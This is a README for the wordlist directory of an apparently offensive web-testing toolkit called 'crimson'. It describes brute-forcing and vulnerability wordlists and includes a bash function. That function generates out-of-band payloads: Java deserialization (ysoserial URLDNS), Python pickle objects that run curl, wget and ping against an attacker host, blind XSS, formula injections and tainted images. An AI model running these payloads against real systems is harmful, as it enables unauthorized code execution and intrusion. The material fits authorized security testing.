# WORDS

> This directory contains wordlists of words that I have collected from many different sources and filtered for `crimson`.

* :small_red_triangle_down: exp directory

> This directory contains wordlists for manual and automatic testing of various known vulnerailities.

* :small_red_triangle_down: skeleton directory

> This directory could help you build your own wordlist for directory brute-forcing.

* :small_red_triangle_down: BCK_EXT

> This wordlist contains various extensions for `crimson_backuper`

* :small_red_triangle_down: blank

> This is blank wordlist for `wfuzz`

* :small_red_triangle_down: bug

> This wordlist contains various strings that could make and internal server error or find local file inclusions, path traversals, remote code execution and other known vulnerabilities. It is all around wordlist for manual testing.

* :small_red_triangle_down: dir

> This is wordlist for directory brute-forcing.

* :small_red_triangle_down: npm_names_10000.txt and npm_names_1mln.txt

> This is wordlist for /js/vendor path bruteforcing

* :small_red_triangle_down: quick.txt

> This is wordlist for common directory bruteforcing

* :small_red_triangle_down: dns

> This is wordlist for the subdomain brute-forcing

* :small_red_triangle_down: dns-altsdns.txt

> This is wordlist for `altdns` mutations

* :small_red_triangle_down: exp/AUTH_BYPASS

> First use "Battering ram" with first 200 lines. Then whole list with sniper as username(admin|your_account), then password(Pa$$P0licy_baby123).

* :small_red_triangle_down: common_TCP_ports.txt

> Top 1,000 TCP Ports: nmap -sT --top-ports 1000 -v -oG -

## ALIAS
```bash
function words {
    # Java deserialization payload URLDNS (* swap the java path if does not work)
    java -jar "$HOME"/tools/crimson/scripts/GOAST/ysoserial.jar URLDNS "http://$1" | base64 -w0 |sed "s/$/\n/g" > oob.fuzz
    # PYTHON DESERIALIZATION PING CURL WGET
    python3 $HOME/tools/crimson/scripts/pickle_ser.py "ping $1" >> oob.fuzz
    python3 $HOME/tools/crimson/scripts/pickle_ser.py "curl $1/curl_pickle_ser" >> oob.fuzz
    python3 $HOME/tools/crimson/scripts/pickle_ser.py "wget $1/wget_pickle_ser" >> oob.fuzz
    python3 $HOME/tools/crimson/scripts/pickle_ser.py "ping $2" >> oob.fuzz
    if [[ -z "$3" ]]; then
      python3 $HOME/tools/crimson/scripts/pickle_ser.py "curl $2/curl_pickle_ser" >> oob.fuzz
      python3 $HOME/tools/crimson/scripts/pickle_ser.py "wget $2/wget_pickle_ser" >> oob.fuzz
    else
        python3 $HOME/tools/crimson/scripts/pickle_ser.py "curl $2:$3/curl_pickle_ser" >> oob.fuzz
        python3 $HOME/tools/crimson/scripts/pickle_ser.py "wget $2:$3/wget_pickle_ser" >> oob.fuzz
    fi
      # BLIND XSS PAYLOADS
    python3 "$HOME/tools/crimson/scripts/blind_xss_gen.py" "$HOME/tools/crimson/words/exp/BLIND_XSS" "$1" >> oob.fuzz
    if [[ -z "$3" ]]; then
        python3 "$HOME/tools/crimson/scripts/blind_xss_gen.py" "$HOME/tools/crimson/words/exp/BLIND_XSS" "$2" >> oob.fuzz
    else
        python3 "$HOME/tools/crimson/scripts/blind_xss_gen.py" "$HOME/tools/crimson/words/exp/BLIND_XSS" "$2:$3" >> oob.fuzz
    fi
    # Preparing OOB payloadlist and copying it to the clipboard
    cat "$HOME"/tools/crimson/words/exp/OOB | sed "s/domain_collab/$1/g" |sed "s/vps_ip/$2/g" >> oob.fuzz1
    cat oob.fuzz1 | sed "s/$2:80/$2:$3/g" >> oob.fuzz && rm oob.fuzz1
    cat "$HOME"/tools/crimson/words/exp/BLIND_XSS | sed "s/domain_collab/$1/g" >> oob.fuzz
    cat oob.fuzz | clip.exe
    # Preparing other wordlists and files to upload
    cat "$HOME"/tools/crimson/words/bug >> bug.fuzz
    cat "$HOME"/tools/crimson/words/exp/http_leaks | sed "s/domain_collab/$1/g" >> http_leaks
    cat "$HOME"/tools/crimson/words/exp/bypass_ext >> bypass_ext
    cat "$HOME"/tools/crimson/words/exp/spoofing_headers.txt > spoofing_headers.txt
    # Preparing upload
    mkdir upload
    cd upload
    cp "$HOME"/tools/crimson/upload/* .
    cat exiftool.jpg | sed "s/domain_collab/$1/g" >> 123 && mv 123 exiftooldomain.jpg
    cat exiftool.jpg | sed "s/domain_collab/$2:$3/g" >> 123 && mv 123 exiftoolvps.jpg
    cat formula_injections.txt | sed "s/domain_collab/$1/g" |sed "s/vps_ip/$2/g" >> formula_injections1
    cat formula_injections1 | sed "s/$2:80/$2:$3/g" >> formula_injections.txt && rm formula_injections1
    cd ..
}

```
